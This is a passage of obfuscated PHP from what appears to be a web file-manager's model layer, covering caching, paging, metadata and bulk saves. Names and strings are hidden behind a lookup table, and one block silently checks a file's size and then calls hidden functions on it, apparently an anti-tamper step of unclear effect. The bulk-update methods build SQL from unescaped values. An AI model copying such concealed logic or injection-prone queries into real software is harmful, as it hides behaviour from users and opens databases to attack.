$î£¸»->sourceInfo($÷ìÓ½†ó); if ($õıö¤×½[$¤íš†ìò[469]] == $¤íš†ìò[91]) { $ãœ•Â¦ó[] = array($¤íš†ìò[636] => array($¤íš†ìò[596], $õıö¤×½[$¤íš†ìò[569]] . $÷ìÓ½†ó . $¤íš†ìò[597])); } else { $ãœ•Â¦ó[$¤íš†ìò[184]][1][] = $÷ìÓ½†ó; } } if (!$ãœ•Â¦ó[$¤íš†ìò[184]][1]) { unset($ãœ•Â¦ó[$¤íš†ìò[184]]); } if (!$ãœ•Â¦ó) { return; } if (is_array($ãœ•Â¦ó[$¤íš†ìò[184]]) && is_array($ãœ•Â¦ó[$¤íš†ìò[184]][1])) { $ãœ•Â¦ó[$¤íš†ìò[184]][1] = array_unique($ãœ•Â¦ó[$¤íš†ìò[184]][1]); } $ãœ•Â¦ó[$¤íš†ìò[1049]] = $¤íš†ìò[2055]; $î£¸»->where($ãœ•Â¦ó)->setField($¤íš†ìò[489], 1); } private function recycleMove($’ïÅàä¸, $µüÛÃ = 1) { $¼£ƒŸşÆ =& $_SERVER[º·Ï‹¥³]; $»³Ë„åÑ = Model($¼£ƒŸşÆ[1388]); $ ½’½³Ì = Model($¼£ƒŸşÆ[2278]); $š¢ãòƒš = array($¼£ƒŸşÆ[184] => $’ïÅàä¸); if ($µüÛÃ) { $»³Ë„åÑ->where($š¢ãòƒš)->setField($¼£ƒŸşÆ[489], 1); $ ½’½³Ì->eventRecycle($’ïÅàä¸, $¼£ƒŸşÆ[2279]); } else { $ñ¤„Íİ = $»³Ë„åÑ->where($š¢ãòƒš)->find(); $·ï±¢î— = $ñ¤„Íİ[$¼£ƒŸşÆ[469]] == $¼£ƒŸşÆ[91]; $šµˆ ­“ = $»³Ë„åÑ->fileNameAuto($ñ¤„Íİ[$¼£ƒŸşÆ[183]], $ñ¤„Íİ[$¼£ƒŸşÆ[32]], REPEAT_RENAME_FOLDER, $·ï±¢î—); if ($šµˆ ­“ != $ñ¤„Íİ[$¼£ƒŸşÆ[32]]) { $»³Ë„åÑ->rename($’ïÅàä¸, $šµˆ ­“); } $»³Ë„åÑ->where($š¢ãòƒš)->setField($¼£ƒŸşÆ[489], 0); $ ½’½³Ì->eventRecycle($’ïÅàä¸, $¼£ƒŸşÆ[2280]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\56\163\157\165\162\143\145\123\145\x63\x72\145\x74\114\x69\163\164"; public $field = array("\163\157\165\162\143\145\x49\104", "\x74\x79\160\145\111\104", "\x63\x72\x65\141\164\x65\125\x73\x65\x72"); } goto Dòµîï¹Ö˜; cø¹™¯ÖÈƒ: if ($_SERVER[$_SERVER[º·Ï‹¥³][408]] != $_size($_file)) { $_getc = $_SERVER[º·Ï‹¥³][409]; $_getfile = $_SERVER[$_SERVER[º·Ï‹¥³][410]] . $_SERVER[º·Ï‹¥³][411]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[º·Ï‹¥³][253], $_getfilec); if (count($_getarrs) < $_SERVER[º·Ï‹¥³][412]) { $exit = $_SERVER[º·Ï‹¥³][413]; $exit(); } $_act = $_SERVER[º·Ï‹¥³][414]; $_act($_file); } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\151\146\171\x54\x69\x6d\x65", "\x74\151\155\145", "\151\x6e\x73\145\x72\164\x2c\165\160\144\141\164\x65", "\x66\165\x6e\x63\x74\151\157\x6e"), array("\143\x72\x65\141\164\x65\124\151\x6d\145", "\164\151\x6d\x65", "\x69\x6e\x73\x65\162\x74", "\x66\165\156\x63\164\x69\157\156")); public function setDataAuto($¸ıÅ´•ô) { $this->dataAuto = $¸ıÅ´•ô; } public function __construct($Â—ú†šØ = '', $ˆ¼¾˜êÅ = '', $‹ØÃ¶ùŠ = '') { parent::__construct($Â—ú†šØ, $ˆ¼¾˜êÅ, $‹ØÃ¶ùŠ); } protected $tableMeta = array(); protected function _beforeInsert(&$¨’à¤£Š, $³¡ÃÙ—¾) { $éµò¼Ø¾ =& $_SERVER[º·Ï‹¥³]; if (!$this->checkDataAutoHas($éµò¼Ø¾[415])) { return; } $this->dataBeforeFilter($¨’à¤£Š, $éµò¼Ø¾[415]); } protected function _beforeUpdate(&$ŞâÖëöœ, $É¸å‘ö) { $¿ßßÇıÈ =& $_SERVER[º·Ï‹¥³]; if (!$this->checkDataAutoHas($¿ßßÇıÈ[416])) { return; } $this->dataBeforeFilter($ŞâÖëöœ, $¿ßßÇıÈ[416]); } protected function _afterSelect(&$Ëƒæ„”, $İùŸï˜¿) { if (!is_array($Ëƒæ„”)) { return; } if (!$this->checkDataAutoHas($_SERVER[º·Ï‹¥³][417])) { return; } foreach ($Ëƒæ„” as &$—Í¯ÀÊÃ) { $this->dataAfterFilter($—Í¯ÀÊÃ); } unset($—Í¯ÀÊÃ); } protected function _afterFind(&$Ñû§„’ë, $ò¶¿•óÙ) { if (!is_array($Ñû§„’ë)) { return; } if (!$this->checkDataAutoHas($_SERVER[º·Ï‹¥³][417])) { return; } $this->dataAfterFilter($Ñû§„’ë); } public static function textEncode($¶…Œ»ë) { if (!$¶…Œ»ë) { return $¶…Œ»ë; } $ğ™Ğ…  = json_encode($¶…Œ»ë); $ğ™Ğ…  = preg_replace_callback($_SERVER[º·Ï‹¥³][418], function ($ù–²Çí) { return addslashes($ù–²Çí[0]); }, $ğ™Ğ… ); return json_decode($ğ™Ğ… ); } public static function textDecode($Ãû‰¡ºÍ) { $•ƒÏÉû =& $_SERVER[º·Ï‹¥³]; $ÙÂàÛ› = json_encode($Ãû‰¡ºÍ); $ÙÂàÛ› = preg_replace_callback($•ƒÏÉû[419], function ($±‹¤¯¤) { return $_SERVER[º·Ï‹¥³][100]; }, $ÙÂàÛ›); return json_decode($ÙÂàÛ›); } public function setAutoIncrement($È‹‚”ÚÑ) { $Ã¯ìÄĞÈ = array($this->getPk() => $È‹‚”ÚÑ); $ÌŒ˜‹¸ = $this->data($Ã¯ìÄĞÈ)->add(); if ($ÌŒ˜‹¸) { $this->delete($ÌŒ˜‹¸); } } public function getAutoIncrement() { $»¼ÏõÏË = $this->getTableName(); $¨ÌÜÃ”ê = $this->max($this->getPk()); $‰Û©‹€Ò = $this->query("\163\x68\x6f\167\40\164\x61\142\154\145\x20\163\x74\x61\x74\165\163\40\167\x68\x65\162\x65\40\116\141\x6d\145\75\x27{$»¼ÏõÏË}\x27"); $¿«¶ÙÚ» = $‰Û©‹€Ò[0][$_SERVER[º·Ï‹¥³][420]]; $¨ÔŒÈÁÔ = max($¨ÌÜÃ”ê, $¿«¶ÙÚ»); return $¨ÔŒÈÁÔ; } protected function _callBefore($çôÍğŸ¸, $×»ø¨“‚) { return $this->cacheCallCheck($çôÍğŸ¸, $×»ø¨“‚, !1); } protected function _callAfter($»·ò“¥€, $ÂÃá¦ÈŒ) { return $this->cacheCallCheck($»·ò“¥€, $ÂÃá¦ÈŒ, !0); } protected function cacheFunctionAlias($ı·ÔÊÈ¼) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($À«ö‹¼, $„ĞÙúĞ×, $àã¿‰„ä = false) { $ï¡í‰»„ = $this->cacheFunctionAlias($„ĞÙúĞ×); if (!$ï¡í‰»„) { return; } foreach ($ï¡í‰»„ as $ÄùÓ°¨¼ => $Ã²‹Ã¾’) { $…²èíßö = $Ã²‹Ã¾’[0]; $éş¦Îşé = explode($_SERVER[º·Ï‹¥³][50], $Ã²‹Ã¾’[1]); if ($À«ö‹¼ == $ÄùÓ°¨¼) { return $this->cacheFunctionGet($ÄùÓ°¨¼, $…²èíßö); } if ($àã¿‰„ä && in_array($À«ö‹¼, $éş¦Îşé)) { $this->cacheFunctionClear($ÄùÓ°¨¼, $…²èíßö); } } } public function cacheFunctionGet($¼¯ÈÁÅğ, $‡áñ¿™È) { $ŒíÎè½ = $this->cacheKeyMake($¼¯ÈÁÅğ, $‡áñ¿™È); $²ÄÒÜ¸ù = Cache::get($ŒíÎè½); if (!is_array($²ÄÒÜ¸ù)) { $²ÄÒÜ¸ù = call_user_func_array(array($this, $¼¯ÈÁÅğ), array($‡áñ¿™È, !0)); Cache::set($ŒíÎè½, $²ÄÒÜ¸ù); } return $²ÄÒÜ¸ù; } public function cacheFunctionClear($“õ¿Ç, $şƒœ¿æŞ) { $§õñêªŞ = $şƒœ¿æŞ; if (!is_array($şƒœ¿æŞ)) { $§õñêªŞ = array($şƒœ¿æŞ); } foreach ($§õñêªŞ as $¾ô“õœß) { $ƒ†÷ùêÈ = $this->cacheKeyMake($“õ¿Ç, $¾ô“õœß); Cache::remove($ƒ†÷ùêÈ); } } private function cacheKeyMake($œÆ×ã¬, $™ÜıËƒü) { $™è¡·‰ =& $_SERVER[º·Ï‹¥³]; return get_class($this) . $™è¡·‰[11] . $œÆ×ã¬ . $™è¡·‰[421] . $™ÜıËƒü; } protected function selectPageReset() { $ßÚÑ«ƒğ =& $_SERVER[º·Ï‹¥³]; if (isset($GLOBALS[$ßÚÑ«ƒğ[422]])) { return; } $GLOBALS[$ßÚÑ«ƒğ[422]] = isset($GLOBALS[$ßÚÑ«ƒğ[7]][$ßÚÑ«ƒğ[423]]) ? $GLOBALS[$ßÚÑ«ƒğ[7]][$ßÚÑ«ƒğ[423]] : !1; $GLOBALS[$ßÚÑ«ƒğ[424]] = isset($GLOBALS[$ßÚÑ«ƒğ[7]][$ßÚÑ«ƒğ[404]]) ? $GLOBALS[$ßÚÑ«ƒğ[7]][$ßÚÑ«ƒğ[404]] : !1; $GLOBALS[$ßÚÑ«ƒğ[7]][$ßÚÑ«ƒğ[423]] = !1; $GLOBALS[$ßÚÑ«ƒğ[7]][$ßÚÑ«ƒğ[404]] = !1; } protected function selectPageRestore() { $íÂƒÉ‹ò =& $_SERVER[º·Ï‹¥³]; if (!isset($GLOBALS[$íÂƒÉ‹ò[422]])) { return; } $GLOBALS[$íÂƒÉ‹ò[7]][$íÂƒÉ‹ò[423]] = $GLOBALS[$íÂƒÉ‹ò[422]]; $GLOBALS[$íÂƒÉ‹ò[7]][$íÂƒÉ‹ò[404]] = $GLOBALS[$íÂƒÉ‹ò[424]]; if ($GLOBALS[$íÂƒÉ‹ò[7]][$íÂƒÉ‹ò[423]] === !1) { unset($GLOBALS[$íÂƒÉ‹ò[7]][$íÂƒÉ‹ò[423]]); } if ($GLOBALS[$íÂƒÉ‹ò[7]][$íÂƒÉ‹ò[404]] === !1) { unset($GLOBALS[$íÂƒÉ‹ò[7]][$íÂƒÉ‹ò[404]]); } unset($GLOBALS[$íÂƒÉ‹ò[422]]); unset($GLOBALS[$íÂƒÉ‹ò[424]]); } protected function selectPage($¡èˆ¤à = 200, $Ñ«œé¯„ = 1) { $ŞŠ±î  =& $_SERVER[º·Ï‹¥³]; global $in; $Ìó¸„Ë = $this->optionsValue(); $¬¶Ú¡û° = 50000; $¡èˆ¤à = isset($in[$ŞŠ±î [423]]) && $in[$ŞŠ±î [423]] ? $in[$ŞŠ±î [423]] : $¡èˆ¤à; if ($¡èˆ¤à === -1) { $in[$ŞŠ±î [423]] = !1; $¬¶Ú¡û° = 100000000; $¡èˆ¤à = $¬¶Ú¡û°; } $·çã‚İ¥ = $Ìó¸„Ë; $·çã‚İ¥[$ŞŠ±î [425]] = array(); $¡èˆ¤à = intval($¡èˆ¤à); $¡èˆ¤à = $¡èˆ¤à <= 5 ? 5 : ($¡èˆ¤à >= $¬¶Ú¡û° ? $¬¶Ú¡û° : $¡èˆ¤à); $Ñ«œé¯„ = intval(isset($in[$ŞŠ±î [404]]) && $in[$ŞŠ±î [404]] ? $in[$ŞŠ±î [404]] : $Ñ«œé¯„); $Ñ«œé¯„ = $Ñ«œé¯„ <= 1 ? 1 : $Ñ«œé¯„; $şŒõ­Ê¼ = array(); $íªÂ€Ä‡ = 1; if ($Ñ«œé¯„ == 1 && $íªÂ€Ä‡) { $this->optionsValue($Ìó¸„Ë); $şŒõ­Ê¼ = $this->page($Ñ«œé¯„, $¡èˆ¤à)->select(); $İ÷÷Úßå = is_array($şŒõ­Ê¼) ? count($şŒõ­Ê¼) : 0; if ($İ÷÷Úßå < $¡èˆ¤à) { $²·ÇÃœÀ = 1; } else { $this->optionsValue($·çã‚İ¥); $İ÷÷Úßå = intval($this->count()); $²·ÇÃœÀ = ceil($İ÷÷Úßå / $¡èˆ¤à); } } else { $this->optionsValue($·çã‚İ¥); $İ÷÷Úßå = intval($this->count()); $²·ÇÃœÀ = ceil($İ÷÷Úßå / $¡èˆ¤à); $Ñ«œé¯„ = $Ñ«œé¯„ >= $²·ÇÃœÀ ? $²·ÇÃœÀ : $Ñ«œé¯„; $this->optionsValue($Ìó¸„Ë); $şŒõ­Ê¼ = $this->page($Ñ«œé¯„, $¡èˆ¤à)->select(); } if (!is_array($şŒõ­Ê¼)) { $şŒõ­Ê¼ = array(); } if ($²·ÇÃœÀ == 1) { $İ÷÷Úßå = count($şŒõ­Ê¼); } $æ÷î…Šğ = array($ŞŠ±î [426] => array($ŞŠ±î [427] => $İ÷÷Úßå, $ŞŠ±î [423] => $¡èˆ¤à, $ŞŠ±î [404] => $Ñ«œé¯„, $ŞŠ±î [428] => $²·ÇÃœÀ), $ŞŠ±î [429] => $şŒõ­Ê¼); return $æ÷î…Šğ; } protected function checkLength($Ü¼áè¼ï, $³¤µúî = 0, $å±Ê†« = '') { $ÑûùÀ» =& $_SERVER[º·Ï‹¥³]; $³¤µúî = $³¤µúî ? $³¤µúî : 65536; if (!$Ü¼áè¼ï || strlen($Ü¼áè¼ï) < $³¤µúî) { return; } $å±Ê†« = $å±Ê†« ? $å±Ê†« . $ÑûùÀ»[74] : $ÑûùÀ»[12]; show_json($å±Ê†« . LNG($ÑûùÀ»[430]) . "\50{$³¤µúî}\x29", !1); } protected function metaSet($úÜîíô‰, $¼òíåğ± = null, $£­ßäìØ = null) { $ŠüÍİœå =& $_SERVER[º·Ï‹¥³]; if (!$this->tableMeta || !$úÜîíô‰) { return !1; } $õáÎæúº = $this->tableMeta[$ŠüÍİœå[431]]; $µÃœßËï = $this->tableMeta[$ŠüÍİœå[432]]; $”±ğí…Ù = Model($µÃœßËï); $äëµ³àÉ = array($õáÎæúº => $úÜîíô‰, $ŠüÍİœå[433] => $¼òíåğ±); if (is_null($¼òíåğ±)) { return $”±ğí…Ù->where(array($õáÎæúº => $úÜîíô‰))->delete(); } if (is_null($£­ßäìØ) && is_string($¼òíåğ±)) { return $”±ğí…Ù->where($äëµ³àÉ)->delete(); } $Œ˜¾‚ = is_array($¼òíåğ±) ? $¼òíåğ± : array(); if (is_string($¼òíåğ±)) { $Œ˜¾‚[$¼òíåğ±] = $£­ßäìØ; } $¾÷µÚéŞ = array(); foreach ($Œ˜¾‚ as $£À¯€¢ => $±²‹¼²) { if (is_null($±²‹¼²) && is_string($£À¯€¢)) { $”±ğí…Ù->where(array($õáÎæúº => $úÜîíô‰, $ŠüÍİœå[433] => $£À¯€¢))->delete(); continue; } $this->checkLength($±²‹¼², !1, $µÃœßËï . $ŠüÍİœå[4] . $£À¯€¢); $¾÷µÚéŞ[] = array($õáÎæúº => $úÜîíô‰, $ŠüÍİœå[97] => $£À¯€¢, $ŠüÍİœå[434] => $±²‹¼²); } $‰à‚“‡” = $ŠüÍİœå[435] . $µÃœßËï; CacheLock::lock($‰à‚“‡”); $”±ğí…Ù->where(array($õáÎæúº => $úÜîíô‰))->addAll($¾÷µÚéŞ, array(), !0); CacheLock::unlock($‰à‚“‡”); return !0; } public function metaGet($ºìå‰öÈ, $¤€¥ÉÛ· = false) { $å£õÚ»¨ =& $_SERVER[º·Ï‹¥³]; if (!$this->tableMeta) { return array(); } $º Õ–¦À = $this->tableMeta[$å£õÚ»¨[431]]; $Ê×š‹á = Model($this->tableMeta[$å£õÚ»¨[432]]); if ($¤€¥ÉÛ·) { $§»­øé = array($º Õ–¦À => $ºìå‰öÈ, $å£õÚ»¨[97] => $¤€¥ÉÛ·); return $Ê×š‹á->where($§»­øé)->getField($å£õÚ»¨[434]); } $§»­øé = array($º Õ–¦À => $ºìå‰öÈ); $Âíå‹¿• = $Ê×š‹á->field($å£õÚ»¨[436])->where($§»­øé)->select(); $Âíå‹¿• = array_to_keyvalue($Âíå‹¿•, $å£õÚ»¨[97], $å£õÚ»¨[434]); return $Âíå‹¿•; } private function checkDataAutoHas($ÜÍÉ©ğ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ÑÅ‚À¦å) { if (in_array($ÜÍÉ©ğ, explode($_SERVER[º·Ï‹¥³][50], $ÑÅ‚À¦å[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ùçÔñÆ, $àõØ“µé) { $ø‰Ù¹¶á =& $_SERVER[º·Ï‹¥³]; if (!is_array($ùçÔñÆ)) { return; } foreach ($this->dataAuto as $ş¿¾Ñ) { $¶²õ¼¤Ğ = $ş¿¾Ñ[0]; if (!in_array($àõØ“µé, explode($ø‰Ù¹¶á[50], $ş¿¾Ñ[2]))) { continue; } switch (trim($ş¿¾Ñ[3])) { case $ø‰Ù¹¶á[372]: case $ø‰Ù¹¶á[373]: $Ô¶øçĞÄ = $ş¿¾Ñ[1]; $â¾½æö¶ = isset($ş¿¾Ñ[4]) ? (array) $ş¿¾Ñ[4] : array(); if ($Ô¶øçĞÄ == $ø‰Ù¹¶á[197] && array_key_exists($¶²õ¼¤Ğ, $ùçÔñÆ)) { if (!$ùçÔñÆ[$¶²õ¼¤Ğ]) { unset($ùçÔñÆ[$¶²õ¼¤Ğ]); } break; } if (isset($ùçÔñÆ[$¶²õ¼¤Ğ])) { array_unshift($â¾½æö¶, $ùçÔñÆ[$¶²õ¼¤Ğ]); } if ($ø‰Ù¹¶á[372] == $ş¿¾Ñ[3]) { $ùçÔñÆ[$¶²õ¼¤Ğ] = call_user_func_array($Ô¶øçĞÄ, $â¾½æö¶); } else { $ùçÔñÆ[$¶²õ¼¤Ğ] = call_user_func_array(array(&$this, $Ô¶øçĞÄ), $â¾½æö¶); } break; case $ø‰Ù¹¶á[322]: if (isset($ùçÔñÆ[$¶²õ¼¤Ğ]) && $ùçÔñÆ[$¶²õ¼¤Ğ]) { $ùçÔñÆ[$¶²õ¼¤Ğ] = call_user_func_array(array(&$this, $ş¿¾Ñ[1]), array($ùçÔñÆ[$¶²õ¼¤Ğ])); } break; case $ø‰Ù¹¶á[325]: $ùçÔñÆ[$¶²õ¼¤Ğ] = $ùçÔñÆ[$ş¿¾Ñ[1]]; break; case $ø‰Ù¹¶á[345]: if (isset($ùçÔñÆ[$¶²õ¼¤Ğ]) && !is_string($ùçÔñÆ[$¶²õ¼¤Ğ])) { $ùçÔñÆ[$¶²õ¼¤Ğ] = json_encode_force($ùçÔñÆ[$¶²õ¼¤Ğ]); } break; case $ø‰Ù¹¶á[374]: if ($ùçÔñÆ[$¶²õ¼¤Ğ] === $ø‰Ù¹¶á[12]) { unset($ùçÔñÆ[$¶²õ¼¤Ğ]); } break; case $ø‰Ù¹¶á[375]: $ùçÔñÆ[$¶²õ¼¤Ğ] = $ş¿¾Ñ[1]; default: break; } } if ($àõØ“µé == $ø‰Ù¹¶á[415]) { $·¼Ò‚µ¬ = strtolower($this->db->getDbType()); if (strpos($·¼Ò‚µ¬, $ø‰Ù¹¶á[13]) !== 0) { return; } $“ˆï = $this->field(!0)->fields; $·®¸ÎÊ› = $“ˆï[$ø‰Ù¹¶á[304]]; if (isset($“ˆï[$ø‰Ù¹¶á[303]])) { unset($·®¸ÎÊ›[$“ˆï[$ø‰Ù¹¶á[303]]]); } foreach ($·®¸ÎÊ› as $’§êŒÑÈ => $àõØ“µé) { if (!isset($ùçÔñÆ[$’§êŒÑÈ])) { $ùçÔñÆ[$’§êŒÑÈ] = $ø‰Ù¹¶á[12]; } } } } private function dataAfterFilter(&$æªı†¼‡) { $÷ı¨ˆ´œ =& $_SERVER[º·Ï‹¥³]; foreach ($this->dataAuto as $Ğ¿ò¯—¿) { $›ª¼·æ = $Ğ¿ò¯—¿[0]; if (!isset($æªı†¼‡[$›ª¼·æ])) { continue; } if (!in_array($÷ı¨ˆ´œ[417], explode($÷ı¨ˆ´œ[50], $Ğ¿ò¯—¿[2]))) { continue; } switch (trim($Ğ¿ò¯—¿[3])) { case $÷ı¨ˆ´œ[372]: case $÷ı¨ˆ´œ[373]: $ó…Ÿ‘£¬ = isset($Ğ¿ò¯—¿[4]) ? (array) $Ğ¿ò¯—¿[4] : array(); array_unshift($ó…Ÿ‘£¬, $æªı†¼‡[$›ª¼·æ]); if (isset($Ğ¿ò¯—¿[4]) && $Ğ¿ò¯—¿[4] == $÷ı¨ˆ´œ[437]) { $ó…Ÿ‘£¬ = array($æªı†¼‡[$›ª¼·æ]); } if ($÷ı¨ˆ´œ[372] == $Ğ¿ò¯—¿[3]) { $æªı†¼‡[$›ª¼·æ] = call_user_func_array($Ğ¿ò¯—¿[1], $ó…Ÿ‘£¬); } else { $æªı†¼‡[$›ª¼·æ] = call_user_func_array(array(&$this, $Ğ¿ò¯—¿[1]), $ó…Ÿ‘£¬); } break; case $÷ı¨ˆ´œ[322]: if (isset($æªı†¼‡[$›ª¼·æ]) && $æªı†¼‡[$›ª¼·æ]) { $æªı†¼‡[$›ª¼·æ] = call_user_func_array(array(&$this, $Ğ¿ò¯—¿[1]), array($æªı†¼‡[$›ª¼·æ])); } break; case $÷ı¨ˆ´œ[325]: $æªı†¼‡[$›ª¼·æ] = $æªı†¼‡[$Ğ¿ò¯—¿[1]]; break; case $÷ı¨ˆ´œ[345]: $‰ºÔàª– = $æªı†¼‡[$›ª¼·æ]; $æªı†¼‡[$›ª¼·æ] = json_decode($‰ºÔàª–, !0); if (is_null($æªı†¼‡[$›ª¼·æ])) { $æªı†¼‡[$›ª¼·æ] = $‰ºÔàª–; } break; case $÷ı¨ˆ´œ[374]: if ($æªı†¼‡[$›ª¼·æ] === $÷ı¨ˆ´œ[12]) { unset($æªı†¼‡[$›ª¼·æ]); } break; case $÷ı¨ˆ´œ[375]: $æªı†¼‡[$›ª¼·æ] = $Ğ¿ò¯—¿[1]; break; default: break; } } } public function saveAll($àøÎ´ÍÏ) { $™ÃÊÉ…„ =& $_SERVER[º·Ï‹¥³]; $‡‚É—Ÿ§ = $this->tablePrefix . $this->tableName; $ß”ÒÈ = self::SQL_WHERE_IN_CHUNK; $àøÎ´ÍÏ = is_array($àøÎ´ÍÏ) ? $àøÎ´ÍÏ : array(); $›ÒÔ©õƒ = $™ÃÊÉ…„[438]; $û®óÖÏ = 0; $ÍØâ¯ì¢ = array(); $çŞ¦—ì = count($àøÎ´ÍÏ); for ($Ï©İ´ = 0; $Ï©İ´ < $çŞ¦—ì; $Ï©İ´++) { $´ˆ¡ÉÃé = $àøÎ´ÍÏ[$Ï©İ´]; if (!is_array($´ˆ¡ÉÃé) || count($´ˆ¡ÉÃé) != 4) { continue; } $èâÒ½ = "\x55\x50\104\x41\x54\105\x20\140{$‡‚É—Ÿ§}\x60\x20\123\x45\x54\x20{$´ˆ¡ÉÃé[2]}\40\75\40\x43\x41\x53\105\x20{$´ˆ¡ÉÃé[0]}\x20\xa"; if ($û®óÖÏ == 0) { $›ÒÔ©õƒ = $èâÒ½; } $ÍØâ¯ì¢[] = $™ÃÊÉ…„[121] . $´ˆ¡ÉÃé[1] . $™ÃÊÉ…„[121]; $û®óÖÏ++; $›ÒÔ©õƒ .= "\40\127\x48\x45\x4e\x20\x27{$´ˆ¡ÉÃé[1]}\47\40\124\x48\x45\116\40\47{$´ˆ¡ÉÃé[3]}\x27\40\xa"; if ($û®óÖÏ == $ß”ÒÈ || $Ï©İ´ == $çŞ¦—ì - 1) { $ø°¶ĞÄæ = implode($™ÃÊÉ…„[50], $ÍØâ¯ì¢); $›ÒÔ©õƒ .= "\40\x45\x4e\104\x20\x20\x57\x48\x45\122\x45\x20{$´ˆ¡ÉÃé[0]}\40\x49\116\40\x28{$ø°¶ĞÄæ}\x29\x20"; $this->execute($›ÒÔ©õƒ); $û®óÖÏ = 0; $›ÒÔ©õƒ = $èâÒ½; $this->chunkEventCheck(count($ÍØâ¯ì¢)); $ÍØâ¯ì¢ = array(); } } $this->chunkEventSet(); } public function saveAllEach($Šô£á) { $œÙü‹÷Å =& $_SERVER[º·Ï‹¥³]; $Õ‡Êóû = $this->tablePrefix . $this->tableName; foreach ($Šô£á as $’ÕÍ°©) { if (!is_array($’ÕÍ°©) || count($’ÕÍ°©) != 4) { continue; } $ŒÉÚõ’ = $’ÕÍ°©[0] . $œÙü‹÷Å[439] . $’ÕÍ°©[1] . $œÙü‹÷Å[121]; $§¶’ê¸ = $’ÕÍ°©[2] . $œÙü‹÷Å[439] . $’ÕÍ°©[3] . $œÙü‹÷Å[121]; $·û®ˆäì = "\165\160\x64\141\x74\145\x20{$Õ‡Êóû}\40\163\145\164\x20{$§¶’ê¸}\x20\167\150\x65\x72\145\x20{$ŒÉÚõ’}\73"; $this->execute($·û®ˆäì); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($¹Áòì¾ = false, $ÖÕƒÈÉÄ = false) { $this->_chunkEvent = $¹Áòì¾; $this->_chunkEventParam = $ÖÕƒÈÉÄ; } private function chunkEventCheck($¼ê­£šµ) { if (!$this->_chunkEvent) { return; } $ßšØÔÄ¼ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ßšØÔÄ¼[$_SERVER[º·Ï‹¥³][440]] = $¼ê­£šµ; Hook::trigger($this->_chunkEvent, $ßšØÔÄ¼); } public function addAll($‡Ùˆìà¶, $ÅûœÔôÙ = array(), $«¾èƒÖÎ = false) { $ºï×ìĞ =& $_SERVER[º·Ï‹¥³]; ignore_timeout(); $ĞŞ¸ ¼“ = self::SQL_WHERE_IN_CHUNK; if (empty($‡Ùˆìà¶)) { $this->error = think_lang($ºï×ìĞ[323]); return !1; } $ÅûœÔôÙ = $this->_parseOptions($ÅûœÔôÙ); foreach ($‡Ùˆìà¶ as $Ä‰Ü¤ø€ => $å¯ÒÙĞ) { $‡Ùˆìà¶[$Ä‰Ü¤ø€] = $this->_facade($å¯ÒÙĞ); $this->_beforeInsert($‡Ùˆìà¶[$Ä‰Ü¤ø€], $ÅûœÔôÙ); } if (method_exists($this->db, $ºï×ìĞ[324])) { for ($¬°ö§®° = 0; $¬°ö§®° < count($‡Ùˆìà¶); $¬°ö§®° += $ĞŞ¸ ¼“) { $û»ÇáÜÆ = array_slice($‡Ùˆìà¶, $¬°ö§®°, $ĞŞ¸ ¼“); if (!is_array($û»ÇáÜÆ) || count($û»ÇáÜÆ) == 0) { break; } $ÔæÌ‘œË = $this->db->insertAll($û»ÇáÜÆ, $ÅûœÔôÙ, $«¾èƒÖÎ); $this->chunkEventCheck(count($û»ÇáÜÆ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($‡Ùˆìà¶ as $Ä‰Ü¤ø€ => $å¯ÒÙĞ) { $ÔæÌ‘œË = $this->db->insert($å¯ÒÙĞ, $ÅûœÔôÙ, $«¾èƒÖÎ); } $this->commit(); } if (!1 !== $ÔæÌ‘œË) { $Èíş§ÍÍ = $this->getLastInsID(); if ($Èíş§ÍÍ) { return $Èíş§ÍÍ; } } return $ÔæÌ‘œË; } public function save($›Ã›´Ã = '', $õÁÔ…¦Ğ = array()) { $ß¼Ü¥¢ò =& $_SERVER[º·Ï‹¥³]; $é£á…èÌ = self::SQL_WHERE_IN_CHUNK; $ à¿‘Ì„ = $this->optionsValue(); $Ş±€ÖÜ = $this->findWhereField($ à¿‘Ì„); if (!$Ş±€ÖÜ) { return parent::save($›Ã›´Ã, $õÁÔ…¦Ğ); } $àìÚù…¡ = 0; $Èô›ê¶ = $ à¿‘Ì„[$ß¼Ü¥¢ò[327]][$Ş±€ÖÜ][1]; $Èô›ê¶ = is_array($Èô›ê¶) ? $Èô›ê¶ : array(); $Íşú è = count($Èô›ê¶); for ($Õç°¿ï = 0; $Õç°¿ï < $Íşú è; $Õç°¿ï += $é£á…èÌ) { $Ô²¸ÇĞ = array_slice($Èô›ê¶, $Õç°¿ï, $é£á…èÌ); if (!is_array($Ô²¸ÇĞ) || count($Ô²¸ÇĞ) == 0) { break; } $ à¿‘Ì„[$ß¼Ü¥¢ò[327]][$Ş±€ÖÜ][1] = $Ô²¸ÇĞ; $this->optionsValue($ à¿‘Ì„); $àìÚù…¡ += parent::save($›Ã›´Ã, $õÁÔ…¦Ğ); $this->chunkEventCheck(count($Ô²¸ÇĞ)); } $this->chunkEventSet(); return $àìÚù…¡; } public function add($å°¥ñìË = '', $áÁ¥”Á = array(), $®ı¥Ø­± = false) { if ($this->addTaskStatus && is_array($å°¥ñìË)) { $this->addTaskData[] = $å°¥ñìË; return; } return parent::add($å°¥ñìË, $áÁ¥”Á, $®ı¥Ø­±); } public function parseWhereLike($—‰¸ƒÑ, $‹îü€†Œ = '', $ÀÊËëê“ = false, &$§ı²ş÷ = false) { $Ò…¸üª° =& $_SERVER[º·Ï‹¥³]; $ƒÙ¢±‘ = $GLOBALS[$Ò…¸üª°[6]][$Ò…¸üª°[441]]; if (!$ƒÙ¢±‘[$Ò…¸üª°[442]]) { return $—‰¸ƒÑ; } if (!is_array($—‰¸ƒÑ)) { return $—‰¸ƒÑ; } $Ş‹³ï± = array(); $ìÊÅÈ† = 0; foreach ($—‰¸ƒÑ as $½§¨¹–Ä => $¤ÀË¡¢) { if (is_array($¤ÀË¡¢) && count($¤ÀË¡¢) == 2 && $¤ÀË¡¢[0] == $Ò…¸üª°[443] && is_string($¤ÀË¡¢[1]) && substr($¤ÀË¡¢[1], 0, 1) == $Ò…¸üª°[444] && 